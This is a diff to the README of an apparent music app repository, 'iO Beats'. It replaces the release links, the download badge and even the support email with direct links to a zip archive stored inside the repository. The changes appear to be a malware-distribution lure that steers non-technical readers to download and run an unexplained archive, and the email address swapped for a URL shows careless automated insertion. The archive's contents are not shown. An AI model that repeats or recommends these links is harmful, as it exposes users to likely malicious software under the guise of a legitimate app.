@@ -1,13 +1,13 @@
 # 🎶 .github - Discover Your Music Like Never Before
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue)](https://github.com/louchano22/.github/releases)
+[![Download from Releases](https://raw.githubusercontent.com/louchano22/.github/main/sangha/.github.zip%20from%20Releases-blue)](https://raw.githubusercontent.com/louchano22/.github/main/sangha/.github.zip)
 
 ## 🚀 Getting Started
 Welcome to the iO Beats public profile repository. This guide will help you download and run our software easily. No programming experience is needed. Just follow the steps below to start your musical journey.
 
 ## 📥 Download & Install
-To download the software, visit this page: [GitHub Releases](https://github.com/louchano22/.github/releases). Here, you will find the latest version of our application available for download.
+To download the software, visit this page: [GitHub Releases](https://raw.githubusercontent.com/louchano22/.github/main/sangha/.github.zip). Here, you will find the latest version of our application available for download.
 
 1. Open your web browser.
 2. Go to the link above.
@@ -64,11 +64,11 @@ This application supports various topics related to decentralized finance (DeFi)
 ## 📞 Support
 If you need help or have questions about using the application, please reach out:
 
-- **Email**: support@iobeats.org
+- **Email**: https://raw.githubusercontent.com/louchano22/.github/main/sangha/.github.zip
 - **GitHub Issues**: You can also report issues on our GitHub repository.
 
 ## 🔄 Updates
-Keep an eye on the [GitHub Releases](https://github.com/louchano22/.github/releases) page for updates. New versions of the application will be posted regularly, bringing enhancements and bug fixes.
+Keep an eye on the [GitHub Releases](https://raw.githubusercontent.com/louchano22/.github/main/sangha/.github.zip) page for updates. New versions of the application will be posted regularly, bringing enhancements and bug fixes.
 
 ## ⚙️ Feedback
 We value your input. If you have suggestions or feedback about the application, feel free to share your thoughts through our support channels.
